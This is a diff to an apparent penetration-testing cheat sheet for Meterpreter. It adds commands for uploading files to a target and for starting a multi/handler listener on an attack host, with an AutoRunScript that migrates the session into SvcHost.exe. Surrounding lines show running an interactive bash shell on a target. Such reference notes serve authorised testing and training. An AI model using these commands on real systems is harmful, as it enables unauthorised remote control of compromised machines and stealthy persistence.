@@ -107,6 +107,18 @@ resource <Path to Resource Script> [param 1] [param 2] [param 3]
 ```
 
 # Meterpreter
+##### Upload File
+```bash
+upload <Source> <Destination>
+```
+##### Start Handler with AutoRunScript to Migrate Process
+```bash
+use exploit/multi/handler
+set AutoRunScript migrate -n SvcHost.exe
+set LHOST <Attack Host>
+set LPORT <Port #>
+run -j
+```
 ##### Execute Shell Commands on Target
 ```bash
 meterpreter > execute -f /bin/bash -i -c
